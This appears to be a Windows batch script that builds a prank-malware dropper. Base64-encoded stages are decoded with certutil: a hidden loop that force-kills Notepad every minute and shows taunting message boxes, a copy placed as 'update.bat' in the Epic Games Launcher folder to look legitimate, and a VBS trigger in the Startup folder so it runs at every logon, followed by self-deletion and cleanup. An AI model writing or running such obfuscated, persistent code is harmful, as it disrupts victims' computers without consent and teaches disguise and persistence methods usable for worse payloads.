@echo off

del phoenix.vbs
echo QGVjaG8gb2ZmDQoNCjpsb29wDQp0aW1lb3V0IDYwDQpGT1IgL0YgJSV4IElOICgn > x.b64
echo dGFza2xpc3QgL05IIC9GSSAiSU1BR0VOQU1FIGVxIG5vdGVwYWQuZXhlIicpIERP >> x.b64
echo IElGICUleCA9PSBub3RlcGFkLmV4ZSBnb3RvIEZPVU5EDQpnb3RvIGxvb3ANCg0K >> x.b64
echo OkZPVU5EDQplY2hvIGFHVnVkR0ZwSUQwZ2JYTm5ZbTk0SUNnaVVHeGhlU0JOYVc1 >> x.b64
echo bFkzSmhablFnYVc1emRHVmhaQ0VpTERBc0lDSkcgPiBxLmI2NA0KZWNobyBiM0ow >> x.b64
echo Ym1sMFpTQkxhV1JrYVdVaUtRPT0gPj4gcS5iNjQNCmNlcnR1dGlsIC1kZWNvZGUg >> x.b64
echo InEuYjY0IiAicS52YnMiDQp0aW1lb3V0IDMNCmRlbCBxLmI2NA0KdGFza2tpbGwg >> x.b64
echo L2ltIG5vdGVwYWQuZXhlIC9mDQpzdGFydCBxLnZicw0KdGltZW91dCAxDQpkZWwg >> x.b64
echo cS52YnMNCmdvdG8gbG9vcA== >> x.b64

echo c2V0IFdzaFNoZWxsID0gd3NjcmlwdC5jcmVhdGVvYmplY3QoIldTY3JpcHQuc2hl > z.b64
echo bGwiKQ0KV3NoU2hlbGwucnVuICIiIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcRXBp >> z.b64
echo YyBHYW1lc1xMYXVuY2hlclxFbmdpbmVcQmluYXJpZXNcV2luNjRcdXBkYXRlLmJh >> z.b64
echo dCIiICIsIDAsIHRydWU= >> z.b64

echo QGVjaG8gb2ZmDQoNCmNlcnR1dGlsIC1kZWNvZGUgInguYjY0IiAidXBkYXRlLmJh > y.b64
echo dCIgPm51bA0KY2VydHV0aWwgLWRlY29kZSAiei5iNjQiICJ0cmlnZ2VyLnZicyIg >> y.b64
echo Pm51bA0KZGVsIHguYjY0ID5udWwNCmRlbCB6LmI2NCA+bnVsDQpkZWwgIkM6XFBy >> y.b64
echo b2dyYW0gRmlsZXMgKHg4NilcRXBpYyBHYW1lc1xMYXVuY2hlclxFbmdpbmVcQmlu >> y.b64
echo YXJpZXNcV2luNjRcdXBkYXRlLmJhdCIgPm51bA0KZGVsICIldXNlcnByb2ZpbGUl >> y.b64
echo XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFBy >> y.b64
echo b2dyYW1zXFN0YXJ0dXBcdHJpZ2dlci52YnMiID5udWwNCnhjb3B5ICV+ZHAwXHVw >> y.b64
echo ZGF0ZS5iYXQgIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcRXBpYyBHYW1lc1xMYXVu >> y.b64
echo Y2hlclxFbmdpbmVcQmluYXJpZXNcV2luNjQiID5udWwNCnhjb3B5ICV+ZHAwXHRy >> y.b64
echo aWdnZXIudmJzICIldXNlcnByb2ZpbGUlXEFwcERhdGFcUm9hbWluZ1xNaWNyb3Nv >> y.b64
echo ZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiID5udWwNCnN0 >> y.b64
echo YXJ0IC9iICIiIGNtZCAvYyBkZWwgIiV+ZjAiJmV4aXQgL2I= >> y.b64

echo RGltIG1heCxtaW4scmFuZA0KbWF4PTI1DQptaW49MA0KUmFuZG9taXplDQpyYW5k > f.b64
echo ID0gSW50KChtYXgtbWluKzEpKlJuZCttaW4pDQoNCmhlbnRhaSA9IG1zZ2JveCAo >> f.b64
echo IllvdXIgZGljayBpcyAiICYgcmFuZCAmICIgY20gbGFyZ2UhIiwwLCAiRGljayBN >> f.b64
echo ZXRlciIp >> f.b64

echo c2V0IFdzaFNoZWxsID0gd3NjcmlwdC5jcmVhdGVvYmplY3QoIldTY3JpcHQuc2hl > o.b64
echo bGwiKQ0KV3NoU2hlbGwucnVuICIiIi5cdG1wLmJhdCIiICIsIDAsIHRydWU= >> o.b64

certutil -decode "x.b64" "update.bat"
certutil -decode "z.b64" "trigger.vbs"
certutil -decode "f.b64" "f.vbs"
certutil -decode "o.b64" "o.vbs"
del x.b64 >nul
del z.b64 >nul
del o.b64 >nul
REM start f.vbs
timeout 1 >nul
del f.b64 > nul
REM del f.vbs > nul

certutil -decode "y.b64" "tmp.bat"
timeout 1 >nul
del y.b64
REM start o.vbs
timeout 1 >nul
REM del trigger.vbs
REM del update.bat
REM del o.vbs
REM start /b "" cmd /c del "%~f0" && taskkill /im cmd.exe /f
